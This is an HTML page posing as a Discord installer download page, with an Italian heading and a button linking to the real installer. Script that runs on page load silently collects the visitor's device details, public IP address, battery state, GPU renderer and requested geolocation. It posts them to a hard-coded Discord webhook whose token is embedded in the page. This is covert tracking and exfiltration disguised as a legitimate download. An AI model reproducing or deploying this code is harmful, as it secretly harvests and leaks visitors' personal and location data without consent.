<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <h1>Installazione di Discord sotto</h1>
    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
        Installazione
    </button>
</head>
<body>

    <script>
        async function getDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                online: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null,
                battery: null,
                ipAddress: null,
                webGLRenderer: null,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                location: null,
                hardwareConcurrency: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory || 'N/A',
                storageEstimate: null,
                doNotTrack: navigator.doNotTrack
            };

            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.battery = {
                    charging: battery.charging,
                    level: (battery.level * 100).toFixed(2) + '%',
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }

            await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    deviceInfo.ipAddress = data.ip;
                });

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    deviceInfo.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                });
            }

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    deviceInfo.webGLRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                }
            }

            if (navigator.storage && navigator.storage.estimate) {
                const estimate = await navigator.storage.estimate();
                deviceInfo.storageEstimate = {
                    quota: (estimate.quota / (1024 * 1024 * 1024)).toFixed(2) + ' GB',
                    usage: (estimate.usage / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
                };
            }

            const payload = {
                content: "Device Information: " + JSON.stringify(deviceInfo, null, 2)
            };

            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(response => {
                if (response.ok) {
                    console.log('Device information sent successfully.');
                } else {
                    console.error('Failed to send device information.');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }

        window.onload = getDeviceInfo;
    </script>
</body>
</html>
